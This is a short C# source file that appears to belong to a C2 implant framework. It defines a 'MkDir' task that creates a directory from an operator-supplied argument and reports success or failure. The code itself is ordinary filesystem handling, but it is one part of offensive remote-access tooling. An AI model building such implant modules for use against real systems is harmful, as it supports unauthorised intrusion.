using System.IO;

using Implant.Models;

namespace Implant.Tasks.Execute
{
    class Mkdir : ImplantCommands
    {
        private string dirPath { get; set; }    
        public override string Name => "MkDir";

        public override string Execute(ImplantTask task)
        {
            dirPath = task.Args;
            var currentDir = Directory.GetCurrentDirectory();
            
            if (!(dirPath.Contains(currentDir))) { dirPath = $"{currentDir}\\{task.Args}"; }

            Directory.CreateDirectory(dirPath);

            if (Directory.Exists(dirPath)) { return $"[*] {dirPath} created\n"; }
            return $"[-] Failed to create {dirPath}\n";
        }
    }
}
